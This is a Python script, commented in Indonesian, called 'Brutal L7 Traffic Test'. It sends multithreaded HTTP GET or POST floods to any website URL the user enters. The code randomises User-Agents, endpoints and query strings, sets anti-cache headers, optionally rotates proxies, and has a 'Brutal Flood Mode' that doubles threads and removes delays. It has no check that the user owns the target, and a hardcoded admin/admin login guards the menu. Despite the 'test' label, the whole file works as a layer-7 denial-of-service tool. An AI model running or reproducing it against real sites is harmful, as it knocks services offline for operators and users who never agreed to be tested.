import subprocess
import sys
import pkg_resources
import time
import random
import string
import requests
import threading
from urllib.parse import urlparse, urljoin
from concurrent.futures import ThreadPoolExecutor
from colorama import init, Fore
import getpass
import os

# Inisialisasi colorama untuk output berwarna
init()

# Daftar dependensi yang diperlukan
REQUIRED_PACKAGES = ['requests', 'colorama']

# Daftar User-Agent acak untuk simulasi L7
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Android 11; Mobile; rv:89.0) Gecko/89.0 Firefox/89.0"
]

# Daftar endpoint acak untuk rotasi URL
ENDPOINTS = [
    "", "/home", "/about", "/contact", "/products", "/blog", "/search", "/login", "/profile", "/cart"
]

# Daftar proxy (opsional, bisa diisi manual atau dari file)
PROXIES = [
    # Contoh: {"http": "http://proxy:port", "https": "https://proxy:port"}
]

def install_packages():
    """Fungsi untuk memeriksa dan menginstal dependensi yang diperlukan."""
    print(Fore.CYAN + "Checking and installing required packages...")
    for package in REQUIRED_PACKAGES:
        try:
            pkg_resources.get_distribution(package)
            print(Fore.GREEN + f"{package} is already installed.")
        except pkg_resources.DistributionNotFound:
            print(Fore.YELLOW + f"{package} not found. Installing...")
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", package])
                print(Fore.GREEN + f"{package} installed successfully.")
            except subprocess.CalledProcessError:
                print(Fore.RED + f"Failed to install {package}. Please install it manually using 'pip install {package}'.")
                sys.exit(1)
    print(Fore.CYAN + "All required packages are installed.\n")

def clear_screen():
    """Membersihkan layar konsol."""
    os.system('cls' if os.name == 'nt' else 'clear')

def login():
    """Fungsi untuk menangani login."""
    max_attempts = 3
    attempts = 0
    
    while attempts < max_attempts:
        clear_screen()
        print(Fore.CYAN + "="*50)
        print("          Brutal L7 Traffic Test - Login")
        print("="*50 + "\n")
        
        username = input("Username: ")
        password = getpass.getpass("Password: ")
        
        if username == "admin" and password == "admin":
            print(Fore.GREEN + "\nLogin successful!\n")
            time.sleep(1)
            return True
        else:
            attempts += 1
            remaining = max_attempts - attempts
            print(Fore.RED + f"\nInvalid credentials! {remaining} attempts remaining.")
            input("\nPress Enter to try again...")
    
    print(Fore.RED + "\nToo many failed attempts. Exiting...")
    time.sleep(2)
    return False

def generate_random_payload(size):
    """Menghasilkan payload acak untuk POST request."""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=size))

def generate_random_query():
    """Menghasilkan parameter query acak untuk URL."""
    key = ''.join(random.choices(string.ascii_lowercase, k=5))
    value = ''.join(random.choices(string.ascii_letters + string.digits, k=10))
    return f"{key}={value}"

def make_request(url, request_count, results, method="GET", payload_size=100, use_proxy=False, random_delay=False, flood_mode=False):
    """Fungsi untuk membuat permintaan HTTP ke URL dengan fitur L7 brutal."""
    try:
        # Randomisasi endpoint
        endpoint = random.choice(ENDPOINTS)
        target_url = urljoin(url, endpoint)
        
        # Tambahkan parameter query acak
        if random.randint(0, 1):
            target_url += f"?{generate_random_query()}"
        
        # Randomisasi User-Agent dan header anti-cache
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "keep-alive",
            "Cache-Control": "no-cache, no-store, must-revalidate",
            "Pragma": "no-cache",
            "Expires": "0"
        }
        
        # Konfigurasi proxy (jika diaktifkan)
        proxies = random.choice(PROXIES) if use_proxy and PROXIES else None
        
        # Payload untuk POST (jika metode POST)
        data = None
        if method == "POST":
            data = {"data": generate_random_payload(payload_size)}
        
        # Delay acak untuk simulasi perilaku manusia (tidak digunakan di flood mode)
        if random_delay and not flood_mode:
            time.sleep(random.uniform(0.1, 0.5))
        
        start_time = time.time()
        if method == "GET":
            response = requests.get(target_url, headers=headers, proxies=proxies, timeout=5)
        else:
            response = requests.post(target_url, headers=headers, data=data, proxies=proxies, timeout=5)
        
        elapsed_time = time.time() - start_time
        status = response.status_code
        results.append({
            'request': request_count,
            'status': status,
            'time': elapsed_time
        })
        if status == 200:
            print(Fore.GREEN + f"Request {request_count}: {method} to {target_url} Status {status}, Time: {elapsed_time:.2f}s")
        else:
            print(Fore.RED + f"Request {request_count}: {method} to {target_url} Status {status}, Time: {elapsed_time:.2f}s")
    except requests.RequestException as e:
        results.append({
            'request': request_count,
            'status': 'Error',
            'time': 0
        })
        print(Fore.RED + f"Request {request_count}: {method} to {target_url} Error - {str(e)}")

def traffic_test(url, num_requests, num_threads, method="GET", payload_size=100, use_proxy=False, random_delay=False, flood_mode=False):
    """Fungsi untuk menjalankan pengujian trafik L7 dengan fitur brutal."""
    print(f"\nStarting {'Brutal Flood' if flood_mode else 'L7'} traffic test to {url}")
    print(f"Total Requests: {num_requests}, Threads: {num_threads}, Method: {method}")
    print(f"Payload Size (POST): {payload_size} bytes, Proxy: {'Enabled' if use_proxy else 'Disabled'}")
    print(f"Random Delay: {'Enabled' if random_delay and not flood_mode else 'Disabled'}, Flood Mode: {'Enabled' if flood_mode else 'Disabled'}\n")
    
    results = []
    start_time = time.time()
    
    # Thread pool dengan jumlah thread yang lebih besar untuk flood mode
    max_workers = num_threads * 2 if flood_mode else num_threads
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = [
            executor.submit(make_request, url, i+1, results, method, payload_size, use_proxy, random_delay, flood_mode)
            for i in range(num_requests)
        ]
        for future in futures:
            future.result()
    
    total_time = time.time() - start_time
    
    success_count = sum(1 for r in results if r['status'] == 200)
    error_count = num_requests - success_count
    avg_time = sum(r['time'] for r in results if r['status'] != 'Error') / max(success_count, 1)
    
    print("\n" + "="*50)
    print(f"{'Brutal Flood' if flood_mode else 'L7'} Test Summary for {url}")
    print(f"Total Requests: {num_requests}")
    print(f"Successful Requests: {success_count}")
    print(f"Failed Requests: {error_count}")
    print(f"Average Response Time: {avg_time:.2f}s")
    print(f"Total Test Duration: {total_time:.2f}s")
    print("="*50 + "\n")

def validate_url(url):
    """Validasi URL yang dimasukkan."""
    if not url.startswith(('http://', 'https://')):
        url = 'https://' + url
    try:
        result = requests.get(url, timeout=5)
        return url if result.status_code == 200 else None
    except requests.RequestException:
        return None

def main_menu():
    """Fungsi untuk menampilkan dan menangani main menu."""
    while True:
        clear_screen()
        print(Fore.CYAN + "="*50)
        print("          Brutal L7 Traffic Test - Main Menu")
        print("="*50)
        print("1. Start L7 Traffic Test")
        print("2. Start Brutal Flood Mode")
        print("3. Exit")
        print("="*50 + "\n")
        
        choice = input("Enter your choice (1-3): ")
        
        if choice in ["1", "2"]:
            clear_screen()
            print(Fore.CYAN + "="*50)
            print("          Brutal L7 Traffic Test - Configuration")
            print("="*50 + "\n")
            
            url = input("Enter target website URL: ")
            valid_url = validate_url(url)
            if not valid_url:
                print(Fore.RED + "\nInvalid or unreachable URL. Please check and try again.")
                input("\nPress Enter to continue...")
                continue
            
            try:
                num_requests = int(input("Enter number of requests [default=10]: ") or 10)
                num_threads = int(input("Enter number of threads [default=5]: ") or 5)
                method = input("Enter HTTP method (GET/POST) [default=GET]: ").upper() or "GET"
                if method not in ["GET", "POST"]:
                    print(Fore.RED + "\nInvalid method. Using GET.")
                    method = "GET"
                if method == "POST":
                    payload_size = int(input("Enter POST payload size (bytes) [default=100]: ") or 100)
                else:
                    payload_size = 100
                use_proxy = input("Use proxy? (y/n) [default=n]: ").lower() == 'y'
                random_delay = input("Use random delay? (y/n) [default=n]: ").lower() == 'y' if choice == "1" else False
                flood_mode = choice == "2"
            except ValueError:
                print(Fore.RED + "\nInvalid input. Using default values (10 requests, 5 threads, GET, 100 bytes).")
                num_requests, num_threads, method, payload_size = 10, 5, "GET", 100
                use_proxy, random_delay, flood_mode = False, False, choice == "2"
            
            if use_proxy and not PROXIES:
                print(Fore.YELLOW + "\nWarning: No proxies configured. Continuing without proxy.")
                use_proxy = False
            
            traffic_test(valid_url, num_requests, num_threads, method, payload_size, use_proxy, random_delay, flood_mode)
            input("\nPress Enter to continue...")
        
        elif choice == "3":
            clear_screen()
            print(Fore.YELLOW + "\nThank you for using Brutal L7 Traffic Test!")
            time.sleep(2)
            break
        else:
            print(Fore.RED + "\nInvalid choice. Please select 1, 2, or 3.")
            input("\nPress Enter to continue...")

def main():
    """Fungsi utama untuk menjalankan program."""
    # Instal dependensi secara otomatis
    install_packages()
    
    # Jalankan login dan menu utama
    if login():
        main_menu()

if __name__ == "__main__":
    main()